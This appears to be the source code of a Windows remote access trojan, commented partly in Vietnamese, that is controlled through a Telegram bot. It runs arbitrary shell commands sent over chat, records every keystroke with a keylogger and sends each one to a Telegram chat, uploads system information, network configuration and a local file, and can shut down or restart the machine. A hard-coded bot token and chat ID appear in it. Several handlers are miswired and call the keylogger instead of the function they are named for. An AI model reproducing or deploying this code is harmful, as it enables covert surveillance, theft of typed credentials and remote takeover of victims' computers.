import subprocess
import telebot
import emoji
from pynput import keyboard
from datetime import datetime
from pynput.keyboard import Key, Controller




bot = telebot.TeleBot("1764092484:AAFH54usSJHnb36qu0xTIvbamqBVXEggnc0")
telebot.apihelper.proxy = {'https':'http://10.57.10.34:3128'}

# ---------------------------------------------------------------------------
def console(a):
	split=a.split(" ")
	try:
		bot.send_message(990978363,(subprocess.run(split, stdout=subprocess.PIPE)).stdout.decode())
	except:
		bot.send_message(990978363,"Nhập lại đi, sai cmnr :((")


def run_cmd(a):
	cmd = subprocess.run([a], stdout=subprocess.PIPE)
	return cmd.stdout.decode()
def send_system():
	system = subprocess.run(["systeminfo"], stdout=subprocess.PIPE)
	print((system.stdout).decode())
	return ((system.stdout).decode())
def get_host_name():
	icon=emoji.emojize('⛔',language='es')
	hostname = subprocess.run(["hostname"], stdout=subprocess.PIPE)
	return hostname.stdout.decode()
def send_notify():
	icon = emoji.emojize('⛔', language='es')
	notify=icon+" ["+datetime.now().strftime('%Y-%m-%d %H:%M:%S')+"]"+'\n'+" Have connected from "+get_host_name()
	bot.send_message(990978363,notify)
def shutdown():
	shut = subprocess.run(["shutdown","/s"], stdout=subprocess.PIPE)
	return ((shut.stdout).decode())
def Restart():
	restart = subprocess.run(["shutdown","/r"], stdout=subprocess.PIPE)
	return ((restart.stdout).decode())
def log():
	Log = subprocess.run(["shutdown","/l"], stdout=subprocess.PIPE)
	return ((Log.stdout).decode())
def send_notify_send_files():
	icon = emoji.emojize('⛔', language='es')
	notify=icon+" sendingggg, pls wait.. "
	bot.send_message(990978363,notify)
def send_file():
	bot.send_document(990978363, "C:/Users/tuanpa48/Desktop/test.txt")

def on_press(key):
	bot.send_message(990978363, '{0}'.format(key))

def Listener():
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()
	listener = keyboard.Listener(on_press=on_press)
	listener.stop()

def sceenshot():
	keyboard=Controller()
	with keyboard.pressed(Key.cmd):
		keyboard.press(Key.print_screen)

# ---------------------------------------------------------------------------

@bot.message_handler(commands=['ipconfig'] )
def send_ipconfig(message):
	bot.send_message(990978363,run_cmd('ipconfig'))

@bot.message_handler(commands=['sys'] )
def send_system_run(message):
	bot.send_message(990978363,send_system())

@bot.message_handler(commands=['monitor'] )
def send_system_run(message):
	bot.send_message(990978363,Listener())

@bot.message_handler(commands=['shutdowm'] )
def send_system_run(message):
	Listener()

@bot.message_handler(commands=['restart'] )
def send_system_run(message):
	bot.send_message(990978363,Listener())

@bot.message_handler(commands=['log'] )
def send_system_run(message):
	bot.send_message(990978363,Listener())

@bot.message_handler(commands=['screen'] )
def send_system_run(message):
	sceenshot()
	# code dùng để gửi ảnh viết vào đây


@bot.message_handler(func=lambda message: True)
def send_sonsole(message):
	if(message.text !='/test'):
		print(message.text)
		console(message.text)

# ---------------------------------------------------------------------------
if __name__ == '__main__':
		# bot.send_message(990978363,console('systeminfo /?'))
		send_notify()
		bot.polling()
